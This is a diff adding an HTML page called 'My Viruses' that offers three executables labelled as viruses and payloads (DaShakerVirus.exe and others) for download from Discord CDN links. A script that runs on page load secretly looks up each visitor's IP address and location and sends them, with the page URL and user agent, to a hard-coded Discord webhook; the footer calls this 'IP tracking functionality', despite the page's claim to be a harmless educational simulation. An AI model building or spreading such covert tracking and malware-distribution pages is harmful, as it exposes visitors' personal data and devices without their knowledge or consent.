@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>◆ My Viruses: Protocol Interface ◆</title>
+    <style>
+        /* CSS Variables */
+        :root {
+            --bg-dark: #0a0a0d;
+            --bg-medium: #15151a;
+            --text-light: #e0e0e0;
+            --text-medium: #b0b0b0;
+            --accent-purple: #7a00ff;
+            --accent-purple-light: #9d3bff;
+            --glow-color: rgba(122, 0, 255, 0.6);
+        }
+
+        /* --- Animations --- */
+        @keyframes title-pulse {
+            0% { transform: scale(1); text-shadow: 0 0 10px var(--accent-purple); }
+            50% { transform: scale(1.02); text-shadow: 0 0 15px var(--accent-purple-light); }
+            100% { transform: scale(1); text-shadow: 0 0 10px var(--accent-purple); }
+        }
+        @keyframes button-glow {
+            0% { box-shadow: 0 0 10px var(--glow-color); }
+            50% { box-shadow: 0 0 25px var(--glow-color), 0 0 40px rgba(122, 0, 255, 0.4); }
+            100% { box-shadow: 0 0 10px var(--glow-color); }
+        }
+
+        /* --- Base Style --- */
+        body {
+            font-family: 'Segoe UI', 'Roboto Mono', monospace, sans-serif;
+            text-align: center;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            padding: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 6vw, 4rem);
+            color: var(--text-light);
+            margin-bottom: 2rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5rem;
+            text-shadow: 0 0 10px var(--accent-purple), 0 0 20px var(--accent-purple-light);
+            animation: title-pulse 5s infinite ease-in-out;
+        }
+
+        .main-container {
+            width: 95%;
+            max-width: 1200px;
+            margin-top: 30px;
+            background-color: var(--bg-medium);
+            border-radius: 15px;
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.7), 0 0 20px var(--glow-color);
+            border: 1px solid rgba(122, 0, 255, 0.3);
+            overflow: hidden;
+        }
+
+        /* --- Tabs Navigation --- */
+        .tabs {
+            display: flex;
+            justify-content: center;
+            border-bottom: 2px solid var(--accent-purple);
+            background-color: #000000;
+        }
+
+        .tab-button {
+            background: none;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: var(--text-medium);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            letter-spacing: 0.05rem;
+            text-transform: uppercase;
+        }
+
+        .tab-button:hover {
+            color: var(--text-light);
+            background-color: #222233;
+        }
+
+        .tab-button.active {
+            color: var(--accent-purple-light);
+            background-color: var(--bg-medium);
+            border-radius: 8px 8px 0 0;
+            box-shadow: inset 0 3px 10px rgba(122, 0, 255, 0.5);
+        }
+
+        .tab-button.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: var(--accent-purple-light);
+            box-shadow: 0 0 15px var(--accent-purple-light);
+        }
+        
+        /* --- Tab Content --- */
+        .tab-content {
+            padding: 3rem;
+            text-align: left;
+        }
+
+        .tab-pane {
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .tab-pane.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- Downloads Styles --- */
+        .download-buttons {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .download-button {
+            color: var(--text-light);
+            padding: 1.5rem 3rem;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            background-image: linear-gradient(135deg, var(--accent-purple) 0%, var(--accent-purple-light) 100%);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5), 0 0 15px var(--glow-color);
+            border: 2px solid var(--text-light);
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            transform: translateY(0);
+        }
+
+        .download-button:hover {
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7), 0 0 30px var(--glow-color);
+        }
+        
+        /* --- Text Styles --- */
+        .tab-content h2 {
+            font-size: 2rem;
+            color: var(--accent-purple-light);
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 5px rgba(122, 0, 255, 0.7);
+            text-align: center;
+        }
+
+        .tab-content p {
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: var(--text-medium);
+            margin-bottom: 1rem;
+            text-align: left;
+        }
+        
+        .welcome-text {
+            text-align: center;
+            font-size: 1.4rem;
+            line-height: 2;
+            padding: 2rem 0;
+            color: var(--accent-purple-light);
+            text-shadow: 0 0 5px var(--accent-purple);
+        }
+        
+        .developer-info ul {
+            list-style: none;
+            padding: 0;
+        }
+        .developer-info li {
+            background-color: var(--bg-dark);
+            padding: 10px;
+            margin-bottom: 10px;
+            border-left: 5px solid var(--accent-purple);
+            font-size: 1.1rem;
+            color: var(--text-light);
+        }
+        
+        .footer-note {
+            margin-top: 3rem;
+            color: #777;
+            font-style: italic;
+            font-size: 0.9rem;
+            letter-spacing: 0.05rem;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>
+        MY VIRUSES
+        <span style="display: block; font-size: 0.5em; letter-spacing: normal;">◆ Fictive Protocol Interface ◆</span>
+    </h1>
+
+    <div class="main-container">
+        <div class="tabs">
+            <button class="tab-button active" onclick="openTab(event, 'Welcome')">Welcome</button>
+            <button class="tab-button" onclick="openTab(event, 'Downloads')">Downloads</button>
+            <button class="tab-button" onclick="openTab(event, 'AboutMe')">About Me</button>
+            <button class="tab-button" onclick="openTab(event, 'Developer')">Developer</button>
+        </div>
+
+        <div class="tab-content">
+            
+            <div id="Welcome" class="tab-pane active">
+                <h2>System Initiated: Welcome</h2>
+                <p class="welcome-text">
+                    <span style="color: var(--accent-purple-light);">[!] Access Granted.</span> Welcome to the simulated interface for My Viruses.<br> 
+                    Use the tabs above to navigate the protocols and learn more.
+                </p>
+                <p style="text-align: center; color: var(--text-light); margin-top: 3rem;">
+                    Click "Downloads" to view available protocols.
+                </p>
+            </div>
+
+            <div id="Downloads" class="tab-pane">
+                <h2>Initiate Protocol Download</h2>
+                <p style="text-align: center; color: var(--text-medium);">Select the desired payload below to start the download.</p>
+                <div class="download-buttons">
+                    
+                    <a href="https://cdn.discordapp.com/attachments/1436888608035307550/1441453847116775485/DaShakerVirus.exe?ex=6921da02&is=69208882&hm=732c9d8749d7a67c8a9d07d548eb386e2d43e37a0bb1fb83336a496d4f4f9811&" class="download-button">
+                        👾 DaShakerVirus.exe
+                    </a>
+                    
+                    <a href="https://cdn.discordapp.com/attachments/1436888608035307550/1441453907086671882/TheLegendaryMover.exe?ex=6921da10&is=69208890&hm=14fdebdbe0d82ba88cd79402f4a174bc1b44bcd77a9846707cc87b0b66724f90&" class="download-button">
+                        🧪 TheLegendaryMover.exe
+                    </a>
+                    
+                    <a href="https://cdn.discordapp.com/attachments/1436888608035307550/1441454025353465876/AstraCore_Executor.exe?ex=6921da2c&is=692088ac&hm=acf01be9ffb4e94ada1857b040c736ed52a1780bedfbac9de8e83063654a0f90&" class="download-button">
+                        🛠️ AstraCore Executer.exe
+                    </a>
+                </div>
+            </div>
+
+            <div id="AboutMe" class="tab-pane">
+                <h2>About This Project</h2>
+                <p>
+                    Welcome to **My Viruses**, a platform where I explore digital concepts and create simulated programs for educational or experimental purposes. This serves as a demonstration of my capabilities in web design and interactive interfaces.
+                </p>
+                <p>
+                    My passion lies in building visually appealing and technically advanced web experiences. With an eye for detail and a preference for dark themes with purple accents, I strive to deliver a unique user interface.
+                </p>
+            </div>
+
+            <div id="Developer" class="tab-pane">
+                <h2>Developer Info & Status</h2>
+                <p>Find information about the project's development and the person who built this interface here.</p>
+                <div class="developer-info" style="margin-top: 2rem;">
+                    <ul>
+                        <li><span style="color: var(--accent-purple-light);">Status:</span> Active / Online</li>
+                        <li><span style="color: var(--accent-purple-light);">Interface:</span> My Viruses GUI v1.1</li>
+                        <li><span style="color: var(--accent-purple-light);">Build Date:</span> Nov 2025</li>
+                    </ul>
+                </div>
+            </div>
+
+        </div> </div> <p class="footer-note">
+        >> WARNING: Remember to fill in all placeholder text in the tabs. Upload to a server for full IP tracking functionality.
+    </p>
+    
+    <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+
+            // Hide all tab content
+            tabcontent = document.getElementsByClassName("tab-pane");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+                tabcontent[i].classList.remove('active');
+            }
+
+            // Deactivate all tab buttons
+            tablinks = document.getElementsByClassName("tab-button");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+
+            // Show the specific tab and mark the button as active
+            document.getElementById(tabName).style.display = "block";
+            document.getElementById(tabName).classList.add('active');
+            evt.currentTarget.className += " active";
+        }
+        
+        // Ensure the Welcome tab is displayed on load
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.getElementById('Welcome').style.display = 'block';
+        });
+    </script>
+
+    <script>
+        // Fetches visitor IP and geo-location data
+        function getVisitorInfo(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    callback({
+                        ip: data.ip || 'Unknown IP',
+                        city: data.city || 'Unknown City',
+                        country: data.country_name || 'Unknown Country'
+                    });
+                })
+                .catch(() => {
+                    callback({
+                        ip: 'Could not fetch IP',
+                        city: 'N/A',
+                        country: 'N/A'
+                    });
+                });
+        }
+
+        function sendDiscordNotification() {
+            // Webhook URL provided by the user
+            const webhookURL = 'https://discord.com/api/webhooks/1441457987746136064/JueQ7qh2F3HOtPSFUsFCIHxiB0uSBDG3K-rE_nN7srorQv_RR2TuGx3NI3LdaL-itK5u'; 
+            
+            getVisitorInfo(info => {
+                const payload = {
+                    embeds: [
+                        {
+                            title: "🚨 Page Accessed! - My Viruses",
+                            description: "Someone has just landed on your page!",
+                            color: 7993599, // Purple color code (Hex #7A00FF)
+                            timestamp: new Date().toISOString(),
+                            fields: [
+                                {
+                                    name: "📍 Location",
+                                    value: `${info.city}, ${info.country}`,
+                                    inline: true
+                                },
+                                {
+                                    name: "🌐 IP Address",
+                                    value: info.ip,
+                                    inline: true
+                                },
+                                {
+                                    name: "🔗 Page URL",
+                                    value: window.location.href,
+                                    inline: false
+                                },
+                                {
+                                    name: "💻 User Agent",
+                                    value: navigator.userAgent.substring(0, 100) + '...', // Sends device info
+                                    inline: false
+                                }
+                            ],
+                            footer: {
+                                text: "Notification via JavaScript Webhook"
+                            }
+                        }
+                    ]
+                };
+
+                // Send request to Discord
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Discord notification sent successfully.");
+                    } else {
+                        console.error("Error sending Discord notification:", response.status, response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error("Network error sending Discord notification:", error);
+                });
+            });
+        }
+
+        // Call the function when the page loads
+        window.onload = sendDiscordNotification;
+
+    </script>
+</body>
+</html>
